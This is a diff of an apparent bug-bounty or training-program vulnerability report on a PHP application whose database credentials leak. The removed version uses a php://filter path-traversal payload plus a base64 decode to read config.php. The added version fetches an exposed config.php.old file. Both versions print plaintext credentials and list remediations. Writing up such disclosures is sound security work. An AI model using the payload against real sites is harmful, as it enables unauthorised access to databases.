@@ -1,22 +1,27 @@
-# Description  
-I have identified a Harcoded password vulnerability in the config.php.
-A remote attacker could exploit it via the Path transversal vulnerability (report #YWH-PGM14549-85), in order to read the config.php and get database credentials.
+# Description
+The application has exposed an old configuration file (`config.php.old`) containing hardcoded database credentials in plaintext.
+This file is publicly accessible without any authentication, allowing any remote attacker to retrieve sensitive database connection information (username, password, host, database name).
 
-# Exploitation  
-By exploring the source code of the application, I saw that ```index.php``` included a ```config.php``` file, which seems juicy.
+# Exploitation
+The old configuration file is directly accessible at:
+```
+GET /config.php.old HTTP/2
+```
 
-# PoC  
-By using the following payload, I could get the database credentials:
-```
-/index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php
-```
-```
-echo 'PD9waHAKJGhvc3QgPSAnZGInOwokZGIgICA9ICdteV9hc3NvY2lhdGlvbl9kYic7CiR1c2VyID0gJ2VQM1BXekpqJzsKJHBhc3MgPSAndmdUV01vSjInOwokY2hhcnNldCA9ICd1dGY4bWI0JzsKCiRkc24gPSAibXlzcWw6aG9zdD0kaG9zdDtkYm5hbWU9JGRiO2NoYXJzZXQ9JGNoYXJzZXQiOwokb3B0aW9ucyA9IFsKICAgIFBETzo6QVRUUl9FUlJNT0RFICAgICAgICAgICAgPT4gUERPOjpFUlJNT0RFX0VYQ0VQVElPTiwKICAgIFBETzo6QVRUUl9ERUZBVUxUX0ZFVENIX01PREUgPT4gUERPOjpGRVRDSF9BU1NPQywKICAgIFBETzo6QVRUUl9FTVVMQVRFX1BSRVBBUkVTICAgPT4gZmFsc2UsCl07Cgp0cnkgewogICAgJHBkbyA9IG5ldyBQRE8oJGRzbiwgJHVzZXIsICRwYXNzLCAkb3B0aW9ucyk7Cn0gY2F0Y2ggKFxQRE9FeGNlcHRpb24gJGUpIHsKICAgIHRocm93IG5ldyBcUERPRXhjZXB0aW9uKCRlLT5nZXRNZXNzYWdlKCksIChpbnQpJGUtPmdldENvZGUoKSk7Cn0KPz4K' | base64 -d
+No authentication or path traversal is required — the file is served as-is by the web server.
+
+# PoC
+By simply requesting `/config.php.old`, the server returns the full PHP configuration with plaintext credentials:
+
+![Burp Suite showing request and response for config.php.old](config_old_burp.png)
+
+The response reveals:
+```php
 <?php
 $host = 'db';
 $db   = 'my_association_db';
-$user = 'eP3PWzJj';
-$pass = 'vgTWMoJ2';
+$user = 'user';
+$pass = 'userpassword';
 $charset = 'utf8mb4';
 
 $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
@@ -33,16 +38,25 @@ try {
 }
 ?>
 ```
-You can see this critical information : 
+
+Critical information exposed:
 ```
-$user = 'eP3PWzJj';
-$pass = 'vgTWMoJ2';
+$user = 'user';
+$pass = 'userpassword';
 ```
 
 # Risk
-An attacker who gains access to this file could get all the needed information to connect to the database and perform malicious actions.
+- Data Breach: exposure of sensitive user data or application data stored in the database
+- Unauthorized Access: attacker gaining control of the database and manipulating data
+- Privilege Escalation: using exposed credentials to escalate privileges or pivot within the network
+- SQL injection attacks with elevated privileges using the leaked credentials
 
-# Remediation  
-Remove all hardcoded passwords from the source code. Store them securely using configuration files outside the web root with restricted permissions, or a secrets' management solution. Rotate any exposed credentials immediately.
+# Remediation
+1. Remove the `config.php.old` file from the web-accessible directory
+2. Restrict file access using `.htaccess` or server configuration to block access to sensitive files
+3. Implement proper file permissions so only authorized processes can access configuration files
+4. Use environment variables or a secure vault to store sensitive credentials instead of hardcoding them
+5. Regularly rotate credentials and ensure old credentials are invalidated
+
 # Author
-EPSIMontpellier-LosPoulatchos
+4_fromages
